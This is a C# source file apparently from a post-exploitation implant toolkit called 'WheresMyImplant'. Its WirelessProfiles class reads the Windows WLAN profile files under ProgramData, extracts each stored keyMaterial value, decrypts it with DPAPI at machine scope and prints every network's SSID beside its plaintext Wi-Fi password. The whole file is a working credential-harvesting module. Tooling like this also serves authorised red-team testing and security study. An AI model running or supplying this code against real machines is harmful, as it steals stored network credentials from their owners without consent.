using System;
using System.IO;
using System.Globalization;
using System.Security.Cryptography;
using System.Xml;

namespace WheresMyImplant
{
    class WirelessProfiles : Base
    {
        String[] interfaces;

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public WirelessProfiles() : base()
        {
            interfaces = Directory.GetDirectories(@"C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\");
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public void GetProfiles()
        {
            WriteOutput(String.Format("{0,-20} {1,-63}", "SSID", "PSK"));
            WriteOutput(String.Format("{0,-20} {1,-63}", "----", "---"));

            XmlDocument doc = new XmlDocument();
            foreach (String inter in interfaces)
            {
                String[] files = Directory.GetFiles(inter);
                foreach (String file in files)
                {
                    doc.Load(file);
                    XmlNodeList name = doc.GetElementsByTagName("name");

                    XmlNodeList keys = doc.GetElementsByTagName("keyMaterial");
                    foreach (XmlNode key in keys)
                    {
                        WriteOutput(String.Format("{0,-20} {1,-63}", name[0].InnerText, DPAPIDecrypt(key.InnerText)));
                    }
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Decrypts an input string via the DPAPI
        ////////////////////////////////////////////////////////////////////////////////
        public static String DPAPIDecrypt(String input)
        {
            Char[] array = input.ToCharArray();
            Int32 hold;
            System.Text.StringBuilder test = new System.Text.StringBuilder();

            Byte[] inputBytes = new Byte[array.Length / 2];
            Int32 j = 0;
            for (Int32 i = 0; i < array.Length; i += 2)
            {
                String chars = String.Format("{0}{1}", array[i], array[i + 1]);
                if (Int32.TryParse(chars, NumberStyles.HexNumber, CultureInfo.InvariantCulture, out hold))
                {
                    inputBytes[j] = Convert.ToByte((char)hold);
                    j++;
                }
            }
            Byte[] outputBytes = ProtectedData.Unprotect(inputBytes, null, DataProtectionScope.LocalMachine);
            return System.Text.Encoding.ASCII.GetString(outputBytes);
        }

        ~WirelessProfiles()
        {
        }
    }
}